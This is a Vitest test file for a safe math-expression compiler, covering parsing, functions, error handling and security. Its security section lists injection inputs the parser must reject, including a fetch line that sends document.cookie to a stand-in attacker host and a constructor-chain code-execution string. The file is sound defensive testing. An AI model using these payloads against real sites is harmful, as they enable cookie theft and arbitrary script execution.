import { describe, it, expect, vi, afterEach } from 'vitest';
import { compileMathExpression } from './compileMathExpression';

const evalAt = (src: string, x: number) => {
  const fn = compileMathExpression(src);
  if (!fn) throw new Error(`failed to compile: ${src}`);
  return fn(x);
};

describe('compileMathExpression', () => {
  describe('arithmetic', () => {
    it('evaluates x and numbers', () => {
      expect(evalAt('x', 3)).toBe(3);
      expect(evalAt('42', 0)).toBe(42);
      expect(evalAt('1.5', 0)).toBe(1.5);
      expect(evalAt('.5', 0)).toBe(0.5);
      expect(evalAt('1e3', 0)).toBe(1000);
    });

    it('respects operator precedence and parentheses', () => {
      expect(evalAt('1 + 2 * 3', 0)).toBe(7);
      expect(evalAt('(1 + 2) * 3', 0)).toBe(9);
      expect(evalAt('10 - 4 - 3', 0)).toBe(3);
      expect(evalAt('16 / 4 / 2', 0)).toBe(2);
    });

    it('supports ^ and ** as right-associative exponentiation', () => {
      expect(evalAt('x^2', 3)).toBe(9);
      expect(evalAt('x**2', 3)).toBe(9);
      expect(evalAt('2^3^2', 0)).toBe(512);
      expect(evalAt('2^-1', 0)).toBe(0.5);
    });

    it('binds unary minus looser than exponentiation', () => {
      expect(evalAt('-x^2', 3)).toBe(-9);
      expect(evalAt('(-x)^2', 3)).toBe(9);
      expect(evalAt('--x', 3)).toBe(3);
      expect(evalAt('+x', 3)).toBe(3);
    });
  });

  describe('functions and constants', () => {
    it('supports the syntax used by existing templates', () => {
      expect(evalAt('sin(x)', Math.PI / 2)).toBeCloseTo(1);
      expect(evalAt('x^2', 2)).toBe(4);
    });

    it('supports common math functions', () => {
      expect(evalAt('cos(0)', 0)).toBe(1);
      expect(evalAt('sqrt(x)', 16)).toBe(4);
      expect(evalAt('abs(x)', -2)).toBe(2);
      expect(evalAt('log(e)', 0)).toBeCloseTo(1);
      expect(evalAt('exp(0)', 0)).toBe(1);
      expect(evalAt('pow(x, 3)', 2)).toBe(8);
      expect(evalAt('max(1, x, 3)', 5)).toBe(5);
    });

    it('does not mangle function names that contain other names', () => {
      // The previous regex-based approach turned asin into aMath.sin
      expect(evalAt('asin(1)', 0)).toBeCloseTo(Math.PI / 2);
      expect(evalAt('atan(1)', 0)).toBeCloseTo(Math.PI / 4);
    });

    it('supports PI and E constants', () => {
      expect(evalAt('PI', 0)).toBe(Math.PI);
      expect(evalAt('pi', 0)).toBe(Math.PI);
      expect(evalAt('E', 0)).toBe(Math.E);
      expect(evalAt('2 * PI * x', 1)).toBeCloseTo(2 * Math.PI);
    });

    it('rejects wrong arity', () => {
      expect(compileMathExpression('sin(1, 2)')).toBeNull();
      expect(compileMathExpression('pow(2)')).toBeNull();
    });
  });

  describe('non-finite results', () => {
    it('returns NaN for division by zero and out-of-domain inputs', () => {
      expect(evalAt('1 / x', 0)).toBeNaN();
      expect(evalAt('sqrt(x)', -1)).toBeNaN();
      expect(evalAt('log(x)', 0)).toBeNaN();
    });
  });

  describe('invalid input', () => {
    it.each(['', '   ', 'x +', '(x', 'x)', '2x', 'sin', 'sin x', 'foo(x)', 'y', '1 ? 2 : 3', 'x; 1'])(
      'returns null for %j',
      src => {
        expect(compileMathExpression(src)).toBeNull();
      }
    );

    it('returns null for non-string input', () => {
      expect(compileMathExpression(2 as unknown as string)).toBeNull();
      expect(compileMathExpression(undefined as unknown as string)).toBeNull();
    });

    it('rejects overly long or deeply nested expressions', () => {
      expect(compileMathExpression('x+'.repeat(300) + 'x')).toBeNull();
      expect(compileMathExpression('('.repeat(100) + 'x' + ')'.repeat(100))).toBeNull();
    });
  });

  describe('security', () => {
    afterEach(() => {
      vi.restoreAllMocks();
    });

    it.each([
      "fetch('//evil.example?'+document.cookie)",
      'alert(1)',
      'constructor',
      "constructor.constructor('return 1')()",
      '__proto__',
      'toString(x)',
      'hasOwnProperty(x)',
      'Math.sin(x)',
      'window',
      'this',
      '`${x}`',
      'x => x',
      '[x]',
      'x.y',
    ])('rejects %j', src => {
      expect(compileMathExpression(src)).toBeNull();
    });

    it('never executes code embedded in an expression', () => {
      const spy = vi.fn();
      (globalThis as unknown as { __pwned: unknown }).__pwned = spy;
      const fn = compileMathExpression('__pwned()');
      fn?.(1);
      expect(fn).toBeNull();
      expect(spy).not.toHaveBeenCalled();
      delete (globalThis as unknown as { __pwned?: unknown }).__pwned;
    });
  });
});
